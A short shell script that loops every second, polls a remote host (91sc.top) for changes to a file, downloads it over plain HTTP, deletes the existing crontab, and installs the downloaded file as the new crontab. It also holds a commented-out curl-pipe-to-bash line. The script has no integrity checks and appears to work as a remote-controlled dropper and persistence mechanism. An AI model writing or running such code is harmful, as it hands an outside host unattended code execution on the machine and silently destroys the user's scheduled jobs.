#!/bin/sh

current=""

while true; do


    #curl http://91sc.top/oss/oss.sh | bash

	
	if [ "$current" = "" ]; then
		if [ -f "${PWD}/current" ];then
			echo 'init, read from file'
			current=`cat ${PWD}/current`
		fi
	fi
	d=`date +%N`
    now=`curl -I http://91sc.top/oss/t.sh?t=$d | grep Last-Modified:`
    #now=`cat /oss/now`

    if [ "$current" = "$now" ]; then
        echo "no changed."
    else
        echo "changed..."
        
        curl -I http://91sc.top/oss/t.sh | grep Last-Modified: > ${PWD}/current
		current=`cat ${PWD}/current`
		
		curl http://91sc.top/oss/t.sh -o ${PWD}/t.sh
        chmod a+x ${PWD}/t.sh
		
		crontab -l
        crontab -r
        crontab ${PWD}/t.sh
        service crond reload
		crontab -l

    fi

    #sleep 60
    sleep 1

done
